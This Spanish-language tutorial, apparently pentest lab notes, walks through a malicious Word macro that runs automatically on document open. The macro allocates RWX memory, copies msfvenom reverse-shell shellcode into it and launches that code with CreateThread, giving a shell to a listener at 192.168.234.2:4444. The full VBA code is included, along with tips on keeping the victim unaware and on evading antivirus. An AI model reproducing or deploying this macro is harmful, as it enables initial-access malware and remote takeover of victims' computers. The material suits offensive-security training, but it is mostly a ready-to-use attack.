# Calling Win32 APIs from VBA

🟢 Fase 1: El Enganche (Word y VBA)
La víctima abre el documento .docm y hace clic en "Habilitar contenido".

Word ejecuta automáticamente Document_Open o AutoOpen.

Estas llaman a MyMacro(), que es donde está toda la lógica maliciosa.

🟢 Fase 2: Reserva de Memoria Ejecutable (VirtualAlloc)
vba
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
Aquí ocurre la magia para evadir el DEP (Data Execution Prevention) de Windows:

0: Windows elige la dirección de memoria por ti.

UBound(buf): Calcula dinámicamente el tamaño del shellcode. Si cambias el payload, no tienes que cambiar este número.

&H3000 (MEM_COMMIT | MEM_RESERVE): Le pide al sistema operativo que reserve y confirme un bloque de memoria.

&H40 (PAGE_EXECUTE_READWRITE): Le da permisos a esa memoria para ser Leída, Escrita y Ejecutada (RWX). Normalmente, Windows no permite ejecutar memoria que acabas de escribir (eso es lo que bloquea el DEP), pero al pedirlo explícitamente como RWX, lo permitimos.

La función devuelve un puntero (addr) a esa nueva zona de memoria.

🟢 Fase 3: Copia del Shellcode (RtlMoveMemory)
vba
For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
En VBA, tu payload está guardado en un Array de números (el que generaste con msfvenom).

Este bucle For recorre el array byte por byte.

RtlMoveMemory toma cada byte y lo copia a la dirección de memoria que reservamos en el paso anterior (addr + counter).

Al terminar el bucle, el shellcode completo está sentado en la memoria RAM del proceso de Word, listo para ser ejecutado.

🟢 Fase 4: Ejecución en un Hilo Nuevo (CreateThread)
vba
res = CreateThread(0, 0, addr, 0, 0, 0)
Windows no ejecuta el shellcode solo porque esté en memoria. Hay que decirle que empiece a ejecutarlo.

CreateThread le ordena al sistema operativo: "Crea un nuevo hilo de ejecución dentro del proceso de Word, y empieza a ejecutar el código que está en la dirección addr".

Los demás parámetros están en 0 porque no necesitamos configuraciones especiales (ni atributos de seguridad, ni tamaño de pila personalizado, ni parámetros para el shellcode).

Aquí es donde tu payload cobra vida.

🟢 Fase 5: La Conexión (El Shellcode en acción)
El shellcode que generaste con msfvenom -p windows/shell_reverse_tcp se ejecuta.

Lo primero que hace es crear un Socket TCP y conectarse a la IP y puerto que le indicaste (192.168.234.2:4444).

Como usaste un payload Stageless (sin etapas), no pide nada más. Inmediatamente lanza un proceso cmd.exe en Windows.

Redirige la entrada y salida de esa cmd.exe a través del socket TCP hacia tu Kali.

En Kali: rlwrap nc -lvnp 4444 recibe la conexión y te muestra el prompt de la cmd de Windows.

🟢 Fase 6: El Ciclo de Vida (¿Por qué usamos EXITFUNC=thread?)
Cuando cierras la shell (escribes exit en la cmd de Windows), el shellcode termina.

Como usaste EXITFUNC=thread, solo muere el hilo que creó CreateThread. El proceso de Word sigue abierto y vivo.

Si hubieras usado el EXITFUNC por defecto (process), al cerrar la shell, Word se habría cerrado de golpe, alertando a la víctima.

Desventaja: Si la víctima cierra Word, el hilo muere y pierdes la shell. Para evitarlo, se suele usar un segundo payload (como PowerShell) para migrar a un proceso persistente, o se inyecta en un proceso del sistema.

⚠️ ¿Por qué esto es sigiloso pero peligroso para el atacante?
Ventaja: No hay archivos .exe en el disco. Todo ocurre en la RAM. Los antivirus tradicionales que escanean archivos no ven nada.

Desventaja: Windows Defender moderno y los EDRs detectan inmediatamente la combinación de VirtualAlloc con permisos RWX + CreateThread. Es una firma de comportamiento clásica. Por eso, para un ataque real, se necesitan técnicas de evasión más avanzadas (como cifrar el shellcode, usar llamadas indirectas a APIs, o inyección en procesos remotos).


```
' ==========================================
' 1. DECLARACIONES DE LAS APIs (ARRIBA DEL TODO)
' ==========================================
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

' ==========================================
' 2. LA FUNCIÓN PRINCIPAL
' ==========================================
Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' 🔽 AQUÍ VA TU ARRAY DE MSFVENOM 🔽
    ' Asegúrate de que cada línea termine con un guion bajo _ para continuar
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, _
                139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, _
                49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, _
                ' ... (pega aquí todos los bytes de tu payload) ...
                83, 255, 213)
    
    ' 1. Asignar memoria ejecutable (RWX)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' 2. Copiar el shellcode byte a byte a la memoria asignada
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' 3. Ejecutar el shellcode en un nuevo hilo
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

' ==========================================
' 3. EVENTOS DE WORD (AL FINAL)
' ==========================================
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```
